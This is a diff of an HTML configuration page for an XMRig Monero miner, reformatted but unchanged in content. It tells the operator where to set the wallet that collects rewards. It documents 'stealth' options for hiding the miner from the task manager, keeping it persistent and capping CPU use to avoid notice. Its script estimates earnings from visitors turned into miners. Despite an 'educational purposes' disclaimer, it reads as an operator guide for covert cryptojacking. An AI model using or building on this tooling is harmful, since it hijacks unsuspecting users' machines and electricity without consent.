@@ -1,95 +1,103 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Miner Configuration Tool</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            line-height: 1.6;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            color: #333;
-        }
-        h1, h2, h3 {
-            color: #2c3e50;
-        }
-        .container {
-            background-color: #f9f9f9;
-            border-radius: 8px;
-            padding: 20px;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        }
-        code {
-            background-color: #f1f1f1;
-            padding: 2px 5px;
-            border-radius: 3px;
-            font-family: monospace;
-        }
-        pre {
-            background-color: #f1f1f1;
-            padding: 15px;
-            border-radius: 5px;
-            overflow-x: auto;
-            font-family: monospace;
-        }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input, select {
-            width: 100%;
-            padding: 8px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            padding: 10px 15px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        .result {
-            background-color: #e9f7ef;
-            padding: 15px;
-            border-radius: 5px;
-            margin-top: 20px;
-        }
-        .warning {
-            background-color: #ffebee;
-            color: #c62828;
-            padding: 10px;
-            border-radius: 5px;
-            margin: 20px 0;
-        }
+      body {
+        font-family: Arial, sans-serif;
+        line-height: 1.6;
+        max-width: 800px;
+        margin: 0 auto;
+        padding: 20px;
+        color: #333;
+      }
+      h1,
+      h2,
+      h3 {
+        color: #2c3e50;
+      }
+      .container {
+        background-color: #f9f9f9;
+        border-radius: 8px;
+        padding: 20px;
+        margin-bottom: 20px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      }
+      code {
+        background-color: #f1f1f1;
+        padding: 2px 5px;
+        border-radius: 3px;
+        font-family: monospace;
+      }
+      pre {
+        background-color: #f1f1f1;
+        padding: 15px;
+        border-radius: 5px;
+        overflow-x: auto;
+        font-family: monospace;
+      }
+      .form-group {
+        margin-bottom: 15px;
+      }
+      label {
+        display: block;
+        margin-bottom: 5px;
+        font-weight: bold;
+      }
+      input,
+      select {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        box-sizing: border-box;
+      }
+      button {
+        background-color: #4caf50;
+        color: white;
+        padding: 10px 15px;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        font-size: 16px;
+      }
+      button:hover {
+        background-color: #45a049;
+      }
+      .result {
+        background-color: #e9f7ef;
+        padding: 15px;
+        border-radius: 5px;
+        margin-top: 20px;
+      }
+      .warning {
+        background-color: #ffebee;
+        color: #c62828;
+        padding: 10px;
+        border-radius: 5px;
+        margin: 20px 0;
+      }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <h1>XMRig Miner Configuration Tool</h1>
-    
+
     <div class="warning">
-        <strong>For Educational Purposes Only:</strong> This tool demonstrates how to configure the mining parameters. Using this for malicious purposes is illegal and unethical.
+      <strong>For Educational Purposes Only:</strong> This tool demonstrates how
+      to configure the mining parameters. Using this for malicious purposes is
+      illegal and unethical.
     </div>
-    
+
     <div class="container">
-        <h2>How to Update Your Wallet Address</h2>
-        <p>To update the Monero wallet address where mining rewards will be sent, edit the <code>client/src/lib/minerConfig.ts</code> file:</p>
-        
-        <pre>
+      <h2>How to Update Your Wallet Address</h2>
+      <p>
+        To update the Monero wallet address where mining rewards will be sent,
+        edit the <code>client/src/lib/minerConfig.ts</code> file:
+      </p>
+
+      <pre>
 // Open the file client/src/lib/minerConfig.ts
 // Find this section and replace with your wallet address:
 
@@ -102,72 +110,111 @@ export const minerConfig = {
   wallet: "YOUR_MONERO_WALLET_ADDRESS_HERE",
   
   // Rest of the configuration...
-};</pre>
-        
-        <p>Save the file after making your changes. The new wallet address will be used for all future mining operations.</p>
+};</pre
+      >
+
+      <p>
+        Save the file after making your changes. The new wallet address will be
+        used for all future mining operations.
+      </p>
     </div>
-    
+
     // Removed mining capacity calculator
-    
+
     <div class="container">
-        <h2>Referral Reward Program</h2>
-        <h2>Referral Reward</h2>
-        <p>Invite your friends to join our platform and earn rewards! While the platform retains all mining revenue, users benefit from subscription fees generated by the platform. Share your unique referral link and earn bonuses when your friends make their first subscription.</p>
-        <ul>
-            <li>Earn 5% of your friend's mining revenue for the first month.</li>
-            <li>Get a bonus when your friend reaches their first payout.</li>
-        </ul>
-        <p>Share your referral link: <a href="#">https://example.com/referral</a></p>
+      <h2>Referral Reward Program</h2>
+      <h2>Referral Reward</h2>
+      <p>
+        Invite your friends to join our platform and earn rewards! While the
+        platform retains all mining revenue, users benefit from subscription
+        fees generated by the platform. Share your unique referral link and earn
+        bonuses when your friends make their first subscription.
+      </p>
+      <ul>
+        <li>Earn 5% of your friend's mining revenue for the first month.</li>
+        <li>Get a bonus when your friend reaches their first payout.</li>
+      </ul>
+      <p>
+        Share your referral link: <a href="#">https://example.com/referral</a>
+      </p>
     </div>
-    
+
     <div class="container">
-        <h2>Advanced Configuration Options</h2>
-        <p>The miner configuration file provides several options to balance mining power with stealth:</p>
-        
-        <h3>Performance Settings</h3>
-        <ul>
-            <li><strong>threads</strong>: Number of CPU threads to use (2-4 recommended for stealth)</li>
-            <li><strong>cpuLimit</strong>: CPU usage percentage limit (40-60% recommended)</li>
-            <li><strong>idleOnly</strong>: Only mine when the computer is idle</li>
-            <li><strong>startupDelay</strong>: Delay in seconds before starting mining</li>
-        </ul>
-        
-        <h3>Stealth Settings</h3>
-        <ul>
-            <li><strong>background</strong>: Run as a background process</li>
-            <li><strong>hideFromTaskManager</strong>: Attempt to hide from task manager</li>
-            <li><strong>persistenceLevel</strong>: How aggressively to maintain persistence</li>
-        </ul>
-        
-        <p>Edit these settings in the <code>client/src/lib/minerConfig.ts</code> file to customize the miner behavior.</p>
+      <h2>Advanced Configuration Options</h2>
+      <p>
+        The miner configuration file provides several options to balance mining
+        power with stealth:
+      </p>
+
+      <h3>Performance Settings</h3>
+      <ul>
+        <li>
+          <strong>threads</strong>: Number of CPU threads to use (2-4
+          recommended for stealth)
+        </li>
+        <li>
+          <strong>cpuLimit</strong>: CPU usage percentage limit (40-60%
+          recommended)
+        </li>
+        <li><strong>idleOnly</strong>: Only mine when the computer is idle</li>
+        <li>
+          <strong>startupDelay</strong>: Delay in seconds before starting mining
+        </li>
+      </ul>
+
+      <h3>Stealth Settings</h3>
+      <ul>
+        <li><strong>background</strong>: Run as a background process</li>
+        <li>
+          <strong>hideFromTaskManager</strong>: Attempt to hide from task
+          manager
+        </li>
+        <li>
+          <strong>persistenceLevel</strong>: How aggressively to maintain
+          persistence
+        </li>
+      </ul>
+
+      <p>
+        Edit these settings in the
+        <code>client/src/lib/minerConfig.ts</code> file to customize the miner
+        behavior.
+      </p>
     </div>
-    
+
     <script>
-        function calculateMiningStats() {
-            // Get input values
-            const dailyVisitors = parseInt(document.getElementById('dailyVisitors').value) || 0;
-            const clickRate = parseInt(document.getElementById('clickRate').value) || 0;
-            const retentionDays = parseInt(document.getElementById('retentionDays').value) || 0;
-            const xmrPrice = parseFloat(document.getElementById('xmrPrice').value) || 0;
-            
-            // Calculate miners (same formula as in minerConfig.ts)
-            const dailyNewMiners = dailyVisitors * (clickRate / 100);
-            const totalActiveMiners = Math.round(dailyNewMiners * retentionDays);
-            
-            // Calculate revenue (same formula as in minerConfig.ts)
-            const xmrPerDayPerMiner = 0.0002; // Very rough estimate
-            const totalXmrPerDay = totalActiveMiners * xmrPerDayPerMiner;
-            const usdPerDay = totalXmrPerDay * xmrPrice;
-            const usdPerMonth = usdPerDay * 30;
-            
-            // Update results
-            document.getElementById('minerCount').textContent = totalActiveMiners.toLocaleString();
-            document.getElementById('dailyRevenue').textContent = usdPerDay.toFixed(2);
-            document.getElementById('monthlyRevenue').textContent = usdPerMonth.toFixed(2);
-            
-            // Show results
-            document.getElementById('result').style.display = 'block';
-        }
+      function calculateMiningStats() {
+        // Get input values
+        const dailyVisitors =
+          parseInt(document.getElementById("dailyVisitors").value) || 0;
+        const clickRate =
+          parseInt(document.getElementById("clickRate").value) || 0;
+        const retentionDays =
+          parseInt(document.getElementById("retentionDays").value) || 0;
+        const xmrPrice =
+          parseFloat(document.getElementById("xmrPrice").value) || 0;
+
+        // Calculate miners (same formula as in minerConfig.ts)
+        const dailyNewMiners = dailyVisitors * (clickRate / 100);
+        const totalActiveMiners = Math.round(dailyNewMiners * retentionDays);
+
+        // Calculate revenue (same formula as in minerConfig.ts)
+        const xmrPerDayPerMiner = 0.0002; // Very rough estimate
+        const totalXmrPerDay = totalActiveMiners * xmrPerDayPerMiner;
+        const usdPerDay = totalXmrPerDay * xmrPrice;
+        const usdPerMonth = usdPerDay * 30;
+
+        // Update results
+        document.getElementById("minerCount").textContent =
+          totalActiveMiners.toLocaleString();
+        document.getElementById("dailyRevenue").textContent =
+          usdPerDay.toFixed(2);
+        document.getElementById("monthlyRevenue").textContent =
+          usdPerMonth.toFixed(2);
+
+        // Show results
+        document.getElementById("result").style.display = "block";
+      }
     </script>
-</body>
+  </body>
 </html>
